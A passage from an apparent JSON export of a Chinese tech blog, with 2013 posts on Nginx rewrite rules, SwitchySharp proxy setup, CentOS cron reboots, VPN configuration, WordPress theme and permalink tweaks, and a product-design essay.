也可以直接下载其ODBC的驱动安装程序:“http://www.ch-werner.de/sqliteodbc/sqliteodbc.exe” 现在SQLite ODBC Driver的版本为0.65. 然后在C++程序中就可以使用OTL来统一对数据库的访问。 SQLite的官方主站：http://www.sqlite.org/ SQLite的中文网：http://sqlitecn.feuvan.net/index.html OTL的官方主站：http://otl.sourceforge.net/home.htm 原文:http://tech.ddvip.com/2007-10/119338275636568.html","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"Nginx Location语法与简单配置-转","slug":"nginx-rules","date":"2013-07-02T00:54:18.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"nginx-rules.html","permalink":"https://sobaigu.com/nginx-rules.html","excerpt":"","text":"介绍 Nginx是俄罗斯人编写的十分轻量级的HTTP服务器。Nginx它的发音为“engine X”，是一个高性能的HTTP和反向代理服务器，同时也是一个IMAP/POP3/SMTP 代理服务器。 Location语法 语法：location [=|~|~*|^~] /uri/ &#123; … &#125; 注： ~ 为区分大小写匹配 ~* 为不区分大小写匹配 !~和!~*分别为区分大小写不匹配及不区分大小写不匹配 示例一： location / &#123; &#125; 匹配任何查询，因为所有请求都以/开头。但是正则表达式规则将被优先和查询匹配。 示例二： location =/ &#123;&#125; 仅仅匹配/ 示例三： 123location ~* .(gif|jpg|jpeg)$ ｛rewrite .(gif|jpg)$ /logo.png;｝ 注：不区分大小写匹配任何以gif，jpg，jpeg结尾的文件 ReWrite语法 last：基本上都用这个Flag。 break：中止Rewirte，不在继续匹配 redirect：返回临时重定向的HTTP状态302 permanent：返回永久重定向的HTTP状态301 下面是可以用来判断的表达式： -f和!-f用来判断是否存在文件 -d和!-d用来判断是否存在目录 -e和!-e用来判断是否存在文件或目录 -x和!-x用来判断文件是否可执行 下面是可以用作判断的全局变量 例：http://localhost:88/test1/test2/test.php 123456$host：localhost$server_port：88$request_uri：http://localhost:88/test1/test2/test.php$document_uri：/test1/test2/test.php$document_root：D:nginx/html$request_filename：D:nginx/html/test1/test2/test.php Redirect语法 123456789server &#123; listen 80; server_name start.igrow.cn; index index.html index.php; root html; if ($http_host !~ &quot;^star.igrow.cn$&amp;amp;quot;) &#123; rewrite ^(.*) http://star.igrow.cn$1 redirect; &#125;&#125; 防盗链 123456location ~* .(gif|jpg|swf)$ &#123; valid_referers none blocked start.igrow.cn sta.igrow.cn; if ($invalid_referer) &#123; rewrite ^/ http://$host/logo.png; &#125;&#125; 根据文件类型设置过期时间 123456location ~* .(js|css|jpg|jpeg|gif|png|swf)$ &#123; if (-f $request_filename) &#123; expires 1h; break; &#125;&#125; 禁止访问某个目录 1234location ~* .(txt|doc)$&#123; root /data/www/wwwroot/Linuxtone/test; deny all;&#125; 原文链接:http://idev.yo2.cn/articles/nginx学习之一.html","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"爬墙之Switchysharp for Chrome_科学上网_翻墙爬梯设置_墙内下载","slug":"switchysharp-for-chrome","date":"2013-06-25T05:23:53.000Z","updated":"2024-09-28T00:17:21.256Z","comments":true,"path":"switchysharp-for-chrome.html","permalink":"https://sobaigu.com/switchysharp-for-chrome.html","excerpt":"","text":"前言 活在天朝墙内，翻墙，爬梯，钻隧道的工具玲琅满目，Switchysharp之类的扩展，是天朝网民的必备工具.至于其他各有所能的天朝特色工具，本博主几乎不用，就不折腾了，需要的自行网络搜索即可。 相对于vpn，扩展可以实现按需代理，即度娘之内的清纯网站，自然是不需要费这种力气，而谷爹这样的罪恶资本主义世界产物，肮脏不堪，此时再搭梯子访问。借助Switchysharp之类的扩展，我们可以在清纯与肮脏之间随意游走。 当所用平台没有优秀的客户端时需要此扩展来实现按需代理，其他时候代理程序客户端本身从系统层面就直接完成了。 当然，对于为罪恶资本主义打开通道的Switchysharp，本身想下载都是个问题。有鉴于此，俺就做个搬运工。 当前版本的shadowsocks客户端已经集成了pac规则，可以实现系统里全局设置.浏览器扩展只在不能集成pac的环境使用，如linux下的shadowsocks客户端还需要浏览器配合扩展实现按需代理。 使用方法 安装google浏览器 都说了是Switchysharp for Chrome，那自然是要安装google的chrome浏览器了，浏览器安装天朝还是允许的，只是不允许访问扩展安装网站，自行到chrome官方站点击下载安装即可。 如果连浏览器网站你都打不开，或者嫌弃安装过程过慢，那就用清纯的度娘搜索下载吧，或者点击下载此绿色便携版。 安装Switchysharp扩展 要安装Switchysharp本身就是件困难的事情，chrome新版本可能提示禁止非应用中心的应用，那么你需要将搞代理的事提前，然后创建个chrome的快捷方式如下，快捷方式里面的路径自己搞定，关键是chrome带后面的参数启动： 1Chrome.exe --proxy-server=&quot;socks5://127.0.0.1:1080&quot; --host-resolver-rules=&quot;MAP * 0.0.0.0 ， EXCLUDE localhost&quot; 启动后把不能下的不能装的下好装好.如果你用的chrome版本还不会禁止crx安装，那么将点此进入百度网盘下载(提取码31xu)到的压缩包解压，里面包含2个文件： SwitchySharp.crx—代理扩展安装文件 SwitchyOptions.bak—代理扩展配置备份文件 打开chrome浏览器，在地址栏输入chrome://extensions/或从其他入口进入扩展管理页，然后将SwitchySharp.crx拖拽到此页面内，将提示&quot;确认新增扩展程序&quot;，点击添加即可.安装完成后，将在chrome右上角多出一个带循环箭头编制的圆形图标。 配置Switchysharp及代理规则 在上面下载的压缩包中，包含了一个备份文件，里面已经设置好了一些规则，直接在右上角Switchysharp图标上右键&gt;选项&gt;导入/导出&gt;SwitchySharp选项:从文件恢复，选择SwitchyOptions.bak文件导入，导入完成后建议左键点击右上角Switchysharp图标，选择自动切换模式，整个浏览器按需代理设置即完成。 设置规则见该项目wiki页。 架设代理 此时就需要用到代理资源，如果有别人的代理服务，那直接填上买的或者网上其他途径获取的代理ip和端口。 在上面的代理规则设置中，备份文件里设置的是通过127.0.0.1:1080 socket5代理，表示本地需要有这么个代理程序.实现该代理的程序很多，tor，freeg***，红杏，骑墙等都是好工具，在这推荐V2Ray和Shadowsocks。 Shadowsocks Shadowsocks技术当前正如火如荼。我自己搭建的服务器就不公开了，我只提供使用方法，免费的账号可自行想办法获取，使用者风险自担，也欢迎加QQ群一起交流。 Shadowsocks客户端已经有很多版本了，Windows下使用也很方便，下载shadowsocks-gui即可。 ~~下载回来后，运行起来就知道怎么用了，在此不赘述。~~Shadowsocks代理程序客户端使用方法教程可点此查看 V2Ray 比较完美的伪装方案，自行去查看官方文档。要免费账号到此注册，V2Ray客户端使用新手指南点此查看","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"让centos定期重启","slug":"centos-crond-setting","date":"2013-05-20T00:01:02.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"centos-crond-setting.html","permalink":"https://sobaigu.com/centos-crond-setting.html","excerpt":"VPS运行超过1个月后貌似有点卡，那就加个任务计划，让centos定期重启一把吧。 一般IDC厂商提供的VPS系统或默认安装crond服务，如果没有，请运行yum安装","text":"VPS运行超过1个月后貌似有点卡，那就加个任务计划，让centos定期重启一把吧。 一般IDC厂商提供的VPS系统或默认安装crond服务，如果没有，请运行yum安装 123456789[root@MyVPS2382 ~]# yum install vixie-cronLoaded plugins: fastestmirrorLoading mirror speeds from cached hostfile* base: mirrors.loosefoot.com* extras: mirror.veracruz.co* updates: mirror.pac-12.orgSetting up Install ProcessPackage 4:vixie-cron-4.1-81.el5.i386 already installed and latest versionNothing to do 确认下是否是开机自动启动任务计划管理服务 12[root@MyVPS2382 home]# chkconfig --list | grep crondcrond 0:off 1:off 2:on 3:on 4:on 5:on 6:off 如果非开机自动启动可以用以下命令添加至自动启动。 1chkconfig crond on 基础服务搞定的话就可以开始添加计划任务了，先创建一个配置文件 12[root@MyVPS2382 home]# touch reboot.ini[root@MyVPS2382 home]# vi reboot.ini 配置中输入如下内容：0 7 * * 1 reboot，crontab文件的格式： 1minute hour day month weekday [username] command 字段解释： minute：分，值为0-59 hour：小时，值为1-23 day：天，值为1-31 month：月，值为1-12 weekday：星期，值为0-6（0代表星期天，1代表星期一，以此类推） username：可选项,要执行程序的用户，一般设置为root,不填则以当前用户运行 command：要执行的程序路径（设置为绝对路径）例如：/home/reboot.sh 如需要在2013年4月13日21点17分将系统重启，则在 reboot.ini 中填入：17 21 13 4 * reboot 如需要在每周1早上7点重启VPS，则在 reboot.ini 中填入：0 7 * * 1 reboot 更多centos上添加任务计划规则可以搜索引擎查找帮助。 编辑完成后正式给centos添加任务计划 1[root@MyVPS2382 home]# crontab reboot.ini 查看刚才添加的任务计划是否添加成功 12[root@MyVPS2382 home]# crontab -l0 7 * * 1 reboot ok，已经添加好了，记得将 crond 服务重启，否则就要等下次系统重启后才生效了。 123[root@MyVPS2382 home]# service crond restartStopping crond: [ OK ]Starting crond: [ OK ] 参考链接:http://www.ha97.com/910.html","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"小白VPN使用教程","slug":"use-vpn-by-yourself","date":"2013-05-15T05:23:24.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"use-vpn-by-yourself.html","permalink":"https://sobaigu.com/use-vpn-by-yourself.html","excerpt":"Windows篇 Windows下vpn设置图文教程,此处以Windows 7为例. Windows或Linux视窗环境下的一些操作大家都很熟悉,所以本教程只针对小白,老鸟移步.","text":"Windows篇 Windows下vpn设置图文教程,此处以Windows 7为例. Windows或Linux视窗环境下的一些操作大家都很熟悉,所以本教程只针对小白,老鸟移步. 要使用VPN,我们第一步当然是要新建个vpn连接,在Windows xp系统里面,直接在桌面上的网上邻居&gt;右键&gt;属性就可以打开连接管理界面,在Windows 7系统上也可以这样,但默认是不在桌面显示网上邻居快捷的,所以我们通过点击右下角的小电脑或无线连接图标进入连接管理界面. 在网络及共享中心,我们选择新建一个连接或网络,英文显示是set up a new connection or network,之后就照着做吧,真的无技术可言,只要照着提示操作就可以了. 第1步:打开网络连接 第2步:新建一个网络连接 第3步:选择连接到工作场所 第4步:不选择已存,创建一个新的络连接 第5步:选择使用使用vpn 接下来就填你的vpn地址,用户名和密码了,地址可以是ip地址也可以是域名. 第6步:输入vpn服务器ip或域名,vpn名称随便,只是给自己看的 第7步:输入账号密码,勾选记住密码 vpn连接建立完毕,接下来就可以使用了.在右下角小电脑上左键点击,弹出可用连接界面,选择刚建立的vpn,点击连接,弹出输入用户名和密码的对话框,刚才我们已经保存账号密码了,如果没有就输入账号密码,已经有账号的就直接点连接即可.或在刚才第2步打开网络及共享中心的左边,有个连接管理的入口,进入后在vpn连接上双击或右键连接. 当我们不需要这个vpn时,直接到适配器管理或连接管理界面将其删除即可. Linux篇 linux桌面版,以ubuntu为例,其他版本大同小异. 第1步:添加VPN拨号 第2步:vpn设置 Ubuntu下设置vpn甚至比Windows下更简单,三两下就搞定,左键点击连接图标,弹出下拉中选择vpn连接就可以用了. 至此,简单的vpn使用设置就完成了,作为天朝的子民,好好看看外面罪恶的世界吧,如果腻了,就请19:00准时收看新闻联播进行治愈,一切后果与本人无关. 在使用过程中,可能会遇到拨号失败,692,876等各种错误返回,请自行google检索解决办法,如果是花钱买的,就请联系老板处理,基本上是vpn服务器的问题. 想自己搞一把,可以在本站搜索参考文档:搭建属于自己的VPN服务器","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"做产品，别活在自己的世界里","slug":"dont-live-in-the-world-yourself","date":"2013-05-10T09:04:41.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"dont-live-in-the-world-yourself.html","permalink":"https://sobaigu.com/dont-live-in-the-world-yourself.html","excerpt":"你只看到专家的天马行空，却没看到我们的真实需求;你有你的YY，我有我的使用;你无视我的操作，我决定我的选择;你嘲笑我一定是打开方式不对，我可怜你总是错过;你可以轻视我们是小白，我们会证明这是谁的时代。我是用户，我为自己代言。","text":"你只看到专家的天马行空，却没看到我们的真实需求;你有你的YY，我有我的使用;你无视我的操作，我决定我的选择;你嘲笑我一定是打开方式不对，我可怜你总是错过;你可以轻视我们是小白，我们会证明这是谁的时代。我是用户，我为自己代言。 在信息爆炸的今天，我们永远不缺乏资讯。一个功能、一个产品的上线，都能有大量评头论足。久而久之，我们在漫漫文章中指点江山。O2O、LBS、NFC、Appstore出现的频率越来越高。仿佛不写上就与互联网的时代脱轨，无法弄潮。空谈误国，实干兴邦。还是做一名在路上接地气的产品吧。 没有人可以预知未来与成功 概念终究只是概念，说到底只是披上了看似看专业的词汇。之前的一段时间O2O很火，说是自团购后的又一希望。但至今倒是没看到谁因此而火起来，倒是最近学校煎饼阿姨火了一把。O2O，不是说你把两个O找齐了它就成了的，本末倒置，还是接接地气更健康。没有人可以预知未来与成功，不管是谁。马化腾当年也无法知道QQ的今时今日，不也曾经考虑卖过么?四大门户的搜狐原名爱特信，而之所以叫这个名称，是因为朝阳兄他只是知道自己要做互联网，要做什么，怎么赚钱他也没谱。Pinterest的诞生来自于创始人 Ben Silbermann 为他的女朋友寻找订婚戒指之时。他发现了很多还算中意的戒指，但又需要反复比较。从来，都是应「需」而成，成功也不会在我们念念叨叨中从天而降。空谈误己，实干兴企。活在地上总比活在YY的世界里充实。 世界很大，你很小 张小龙说：“需求只来自你对用户的了解。不来自调研、分析、讨论或竞争对手。”一听窃喜，以后可以少干点活，肆意想象，我了解我的用户。真的么?微信火了之后，给我的感觉是“忽如一夜春风来，千树万树梨花开”。谈需求的人少了，谈人性，谈贪慎痴的人多了。但是如果我说我们封为神一般的乔布斯还调研呢。乔布斯离开苹果创建NeXT的时候可是做了反复的调研，而乔也乐于做。成不了张小龙，却烙下个邯郸学步的恶习。需求是客观存在，只能发现不能创造。因此张小龙的话没错，需求的确来自用户，这是本质，调研是了解用户，探索用户需求的方法，也是透过表征看本质的方法。更何况对于用户的了解也不是凭空而得的，不是吗? 很多时候，我们自以为了解用户。吾之所想即用户之所想，大有范仲淹之“先天下之忧而忧，后天下之乐而乐”之范。但不要忘了，对于产品的熟悉已经行业的熟悉度，有时候就会剑走偏锋，忽略了主流用户的需求与痛点。如果你去小城市小乡镇问问，他们其实更多用的是腾讯微博。或许你也应该曾经听过在百度上面搜索百度的故事。即使就在前几天淘宝鬼脚七也提及，在淘宝搜索上搜索阿里旺旺比比皆是。明白了吗?大多互联网企业在北上广深杭，但是大多数用户却在其他地方。我们感知的只是身边自己熟知的这个大城市。所以我们在选择新浪微博的时候却没注意到腾讯微博的流量要比新浪大多，用户数多多了. 用户的世界很大，分布到五湖四海，我们的世界却很小，只来源于身边。当我们下次出行的时候坐火车吧，你或许会有新的启迪。有的时候，坐坐公交你就会领悟屌丝的痛。 我们再来看一下《简约至上》对于主流用户与专家型用户的描述吧。 主流用户(绝大部分)专家型用户(极少) 希望立即把工作做完喜欢首先设定自己的爱好 想要得到靠谱的结果希望看到完美的结果 害怕弄坏什么有拆解一切刨根问底的冲动 只要合适就行必须精准匹配 想看到示例和故事希望看到的是原理 再伟大的产品，也只是我完成工作的工具 用户并不会使用你的全部功能。究其因，他只是在完成他想他完成的事情而已罢了。就如office功能很多，但是我们从未去了解我们并无需求的功能，不是么?你的编辑工作受影响了吗?你知道Excel功能里有个照相机功能可以截图，而且你更改原图后截图也一并调整么?我想很多人不知道。但这并不影响大部分人的使用。 因为萝卜青菜，各有所爱，会员总是有人要的。产品的价值不在于功能的多寡，在于是否触动用户的高优先级目标。不过，我只是想看看新鲜事，看看资讯而已，你呢? one more example。不要以为你懂我，你丫不懂! “哇塞，炫呆了。用户准喜欢。”很多时候，我们都觉得用户应该喜欢这些功能，因为我们一直走在智能化，AI探索的道路上么。我们从心里压根在盼望自己有特异功能。随着口号产品改变世界的流传，这份热衷也来了。你不用说了，我知道你需要。最后往往用户怒火的一般呐喊：“你丫不懂!” 有没有试过，我要换行新起一段的时候，word却给我下一个编号，我不得不退格删掉调整。有没有试过我明明打的是全小写，你丫的却给我来个首字母大写，我又不得不调整为小写再重新写作。 有没有想过，我已经在搜索框获取光标，这说明已经有一定的搜索意向了，你却给我鲜红的123，非得打断我的操作不可。即使后台统计中搜索今天有什么热门事情，为何不直接首页直接显示呢，硬是想告诉我：“嘿，我知道你想搜啥哦~”我讽君一句：你丫不懂，别装!哦，对，你或许还会说，加载首页直接输入就好了啊，那样不会出现。你控制得了我的页面却无法控制我的使用。你无法知悉用户是在什么环境下使用你的产品。 其实，这样的例子很多很多。比如当我兴冲冲的打开一个App的时候，擦弹层，这是xxx最新版……还无法关掉。用得好好的，谁强奸了我的控制权?如果不是有重大bug的话，给个小点提示不就好了么? 聪明反被聪明误，你丫真不懂。不要用你高尚的YY玷污我等屌丝的龌蹉，我只想快速的完成我想做的事情而已。或许有的时候，产品有着许多无可奈何，Boss的拍脑袋、各部门利益的权衡，但有的确实是我们活在自己的世界里，井底之蛙了。 与其仰望星辰，不如附身耕耘。用户就在那里，不离不弃。我们的世界，不应只有天马行空的概念，不应只有「眼前」的用户，不应以为你了解了全部。求知若渴，虚心若愚。走出来，你就成熟了。 活在苍老师的怀抱里，你永远无法懂得爱情，骚年。走出来吧。 后记： 对于QQ和搜狐的故事可以看看《沸腾十五年》，国外可读《浪潮之巅》，读史知兴替，你懂的。 http://www.cnidp.cn，数据需求可以去申请一个，数据无法确定真实度，但是用于比较还是可以的。 本文作者phoenix_lzq，微信公众账号：phoenix_lzq","categories":[{"name":"瞎逼逼","slug":"瞎逼逼","permalink":"https://sobaigu.com/categories/%E7%9E%8E%E9%80%BC%E9%80%BC/"}],"tags":[{"name":"江湖","slug":"江湖","permalink":"https://sobaigu.com/tags/%E6%B1%9F%E6%B9%96/"}]},{"title":"改造HotNews Pro主题之增加文章页广告位","slug":"ads-display-in-posts-of-hotnews-theme","date":"2013-04-30T00:01:18.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"ads-display-in-posts-of-hotnews-theme.html","permalink":"https://sobaigu.com/ads-display-in-posts-of-hotnews-theme.html","excerpt":"","text":"HotNew Pro主题是个功能强大,且人性化的优秀主题，但文章内容上面没有广告位，我们有时需要在那个位置添加广告，往往就会使用一些广告管理插件.都说插件多了影响网站速度,那除了插件我们怎么给文章添加广告位呢? 下面说一下怎样在HotNew Pro主题文章内容上面添加广告位的方法. 1.新建一个文件adp.php，复制下面代码到里面,保存文件上传文件到HotNewspro/includes/目录下. 12345&lt;div class=&quot;adt&quot;&gt; &lt;div class=&quot;ad_c&quot;&gt;&lt;?php echo stripslashes(get_option(&#x27;swt_adpc&#x27;)); ?&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 2.修改后台控制HotNewspro/includes/theme_options.php 添加这是后台控制广告的找到下面代码 123456789101112array( &quot;name&quot; =&gt; &quot;是否显示正文底部广告&quot;, &quot;desc&quot; =&gt; &quot;默认显示&quot;, &quot;id&quot; =&gt; $shortname.&quot;_adt&quot;, &quot;type&quot; =&gt; &quot;select&quot;, &quot;std&quot; =&gt; &quot;Hide&quot;, &quot;options&quot; =&gt; array(&quot;Display&quot;, &quot;Hide&quot;)), array( &quot;name&quot; =&gt; &quot;输入正文底部广告代码&quot;, &quot;desc&quot; =&gt; &quot;&quot;, &quot;id&quot; =&gt; $shortname.&quot;_adtc&quot;, &quot;type&quot; =&gt; &quot;textarea&quot;, &quot;std&quot; =&gt; &#x27;&lt;a href=&quot;http://faq.wopus.org/&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;http://photo.staticsdo.com/a1/184/278/104/63440-772704496-8_765.jpg&quot; alt=&quot;Wopus问答&quot; /&gt;&lt;/a&gt;&#x27;), 在下面添加 123456789101112array( &quot;name&quot; =&gt; &quot;是否显示正文上面广告&quot;, &quot;desc&quot; =&gt; &quot;默认显示&quot;, &quot;id&quot; =&gt; $shortname.&quot;_adp&quot;, &quot;type&quot; =&gt; &quot;select&quot;, &quot;std&quot; =&gt; &quot;Hide&quot;, &quot;options&quot; =&gt; array(&quot;Display&quot;, &quot;Hide&quot;)), array( &quot;name&quot; =&gt; &quot;输入正文上面广告代码&quot;, &quot;desc&quot; =&gt; &quot;&quot;, &quot;id&quot; =&gt; $shortname.&quot;_adpc&quot;, &quot;type&quot; =&gt; &quot;textarea&quot;, &quot;std&quot; =&gt; &#x27;&lt;a href=&quot;http://faq.wopus.org/&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;http://photo.staticsdo.com/a1/184/278/104/63440-772704496-8_765.jpg&quot; alt=&quot;Wopus问答&quot; /&gt;&lt;/a&gt;&#x27;), 3.修改文章页面HotNewspro/single.php文件,找到 123456789 &lt;?php the_content(&#x27;Read more...&#x27;); ?&gt; &lt;?php wp_link_pages( array( &#x27;before&#x27; =&gt; &#x27;&lt;p class=&quot;pages&quot;&gt;&#x27; . __( &#x27;日志分页:&#x27;), &#x27;after&#x27; =&gt; &#x27;&lt;/p&gt;&#x27; ) ); ?&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;?php if (get_option(&#x27;swt_adt&#x27;) == &#x27;Hide&#x27;) &#123; ?&gt; &lt;?php &#123; echo &#x27;&#x27;; &#125; ?&gt; &lt;?php &#125; else &#123; include(TEMPLATEPATH . &#x27;/includes/adt.php&#x27;); &#125; ?&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;&lt;/div&gt; 改成如下内容 1234567891011121314&lt;div class=&quot;entry&quot;&gt; &lt;div id=&quot;entry&quot;&gt; &lt;?php if (get_option(&#x27;swt_adp&#x27;) == &#x27;Hide&#x27;) &#123; ?&gt; &lt;?php &#123; echo &#x27;&#x27;; &#125; ?&gt; &lt;?php &#125; else &#123; include(TEMPLATEPATH . &#x27;/includes/adp.php&#x27;); &#125; ?&gt; &lt;?php the_content(&#x27;Read more...&#x27;); ?&gt; &lt;?php wp_link_pages( array( &#x27;before&#x27; =&gt; &#x27;&lt;p class=&quot;pages&quot;&gt;&#x27; . __( &#x27;日志分页:&#x27;), &#x27;after&#x27; =&gt; &#x27;&lt;/p&gt;&#x27; ) ); ?&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;?php if (get_option(&#x27;swt_adt&#x27;) == &#x27;Hide&#x27;) &#123; ?&gt; &lt;?php &#123; echo &#x27;&#x27;; &#125; ?&gt; &lt;?php &#125; else &#123; include(TEMPLATEPATH . &#x27;/includes/adt.php&#x27;); &#125; ?&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;&lt;/div&gt; 这就好了，后台主题管理>广告管理处就可以看到\"输入正文上面广告代码\"的选项菜单了.","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"开启网页静态化设置方法","slug":"wp-permalink-to-html","date":"2013-04-21T04:23:48.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"wp-permalink-to-html.html","permalink":"https://sobaigu.com/wp-permalink-to-html.html","excerpt":"","text":"WordPress的确是一款非常棒的博客程序，这一点可以从静态化permalink上就可以看出，更不用说可扩展的插件了.所谓静态化，就是将动态网页(址)转换成静态网页(址)。其中，只将动态网址转换成静态网址叫伪静态化；将动态网页也转换成静态网页叫完全静态化；那么为什么要静态化呢？静态化有哪些好处呢？ WordPress的文章地址默认格式是这种?p=123形式的，它的好处是节省服务器空间、便于互动性强的动态站点的管理，因为每篇文章及其相关数据都保存在数据库里，服务器本身并不需要存放多少内容。另外由于博客是个交互性很强的东西，作者对文章的修改和读者的评论都很频繁，换句话说，一篇文章的页面是经常变化的，WP默认地址格式很好地照顾到了这种动态性。 但是这种地址格式也有弊端。首先是文章每被打开一次，博客程序都要查询一次数据库，从中调出该文章的最新数据并和模板结合，然后输出到用户终端，这在网站访问量很大的时候非常消耗服务器资源，造成网站访问速度下降；其次，传统观点认为这种地址格式对SEO不利，而(2012/06/05/sample-post/)这样的静态地址格式则较易被搜索引擎收录并获得较高的排名；最后，习惯了传统网页地址格式的人会觉得这种格式很不直观，很难看。于是，就有了静态化的说法。前面我们已经讲了只将动态网址转换成静态网址叫伪静态化；将动态网页也转换成静态网页叫完全静态化；那么他们具体是怎么去设置的呢？ 首先，你的服务器（空间）支持rewrite模块功能才行。有的虚拟主机提供商不支持rewrite，如E动网，就无法使用这个功能。若是想本地测试静态化功能，下载安装一个WAMPSERVER（即Windows Apache Mysql PHP集成安装环境），在Apache模块中勾选rewrite_module即可成功. WordPress本身有两种静态化方案，都是伪静态化。在后台，Settings-&gt;Permalink中，可以选择你喜欢的模式。常用到的几个参数： 1234567%year% ’年参数%monthnum% ’月%day% ‘日%postname% ‘发的文章标题名称%post_id% ‘文章ID如系统默认的这个/%year%/%monthnum%/%day%/%postname%/ 就显示这样子：2012/06/05/sample-post/ 你可以选择在Custom项中设置的形式为：/%postname%.html，你也可以在这些参数间加你的定义，如： 123/articles/%postname%.html/posts/%postname%.html/%post_id%-%postname%.html 等等。 而对于分类categories、tags，则可以在： Category base:中加上适当的词语（默认是categories），这里你可以改为：/tag 显示的就如同这样的形式：/tag/ 最后，把WordPress帮你生成的rewrite代码存到名为&quot;.htaccess&quot;的文件，上传到你WordPress的根目录下（如/下），这样动态网址就转换成了静态网址，也就是伪静态化了。 通过某些插件可以实现WordPress的完全静态化，它会将所有文章都保存成html静态网页，存放在服务器上，一旦文章相关数据有更新，该插件将自动更新对应的html文件。可见，完全静态化的好处是：首先，不必文章每打开一次都去查询数据库；只有在文章相关数据有更新时才做一次静态化，这在访问量大的情况下能加快网页访问速度；其次，在传统观点看来，静态网址有利于SEO，第三，网址静态化后比先前美观。对于伪静态化，上面第一条是不成立的，因为网页本身还是动态的。 目前有一款WordPress静态化插件cos-html-cache是不错的，适用于大多数WP用户,http://tech.163.com/07/0824/18/3MMA0VDL00092CHG.html上面有详细的介绍,直接在插件安装页搜索也能找到。 最后，我想说的是是否实现静态化就根据需要了。如果你的存储空间有限而服务器支持rewrite就使用伪静态化；如果存储空间很大就完全静态化；如果存储空间有限而服务器又不支持rewrite，那只好放弃静态化了。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"安装IE10导致Windows 7系统无法通过正版验证","slug":"this-copy-of-windows-is-not-genuine","date":"2013-04-02T04:13:05.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"this-copy-of-windows-is-not-genuine.html","permalink":"https://sobaigu.com/this-copy-of-windows-is-not-genuine.html","excerpt":"","text":"莫名其妙Windows 7 系统提示非正版验证,桌面黑屏,显示this copy of Windows is not genuine,最要命的是每次开机都提示激活. 这系统从09年10月开始用起,Lenovo 刷的bios2.1,没道理这个时候提示非正版,还以为是自己用的这个OEM key被封了,换了很多网上的所谓神key都无忌于事. 之前为了尝鲜,刚从微软的官网下了个IE10,第一个想到微软的自动更新,查看果然附带了其他东西. 而且居然附带了正版验证补丁.但问题是,哥可是刷的BIOS啊,查看BIOS信息也是没问题的,都验证正确,不知道为何. 百般无奈下,怀疑到新装的IE10,卸载也不会还原,不知道做了何改变,之前也未保存还原点.恢复以前的备份,一切都OK,Windows is activated,安装各种更新,没问题,通过自动更新安装IE10,也没问题,应该是微软网站上下载的那个IE10附带了正版验证机制,大家还是不要装的好. 文件:IE10-Windows6.1-x64-en-us.exe 大小: 44335120 字节 文件版本: 10.00.9200.16521 (win8_gdr_soc_ie.130216-2100) 修改时间: 2013年3月28日, 14:19:14 MD5: 7CA1F1F4AB4E9599E2FA79D2684562DA SHA1: 17D1EACA123E453269B12B20863FD5CE96727888 CRC32: 4716910B","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"改造HotNews Pro主题之外部链接加上external nofollow","slug":"wordpress-external-nofollow","date":"2013-03-29T07:58:37.000Z","updated":"2024-09-28T00:17:21.253Z","comments":true,"path":"wordpress-external-nofollow.html","permalink":"https://sobaigu.com/wordpress-external-nofollow.html","excerpt":"","text":"一般认为如果网站有过多的外部链接一定程度上会分散网站的域名的搜索引擎权重，这是站长都不愿看到的。 NoFollow是Google几年前提出的一个新标签，目的是减 少垃圾留言。此标签表明链接与网站作者无关，也就是说搜索引擎不会用这个链接计算网站的 PR值。很多博客程序都会自动在评论链接中加上nofollow标签。现在主流的Blog程序，如WordPress和MovableType，均默认为 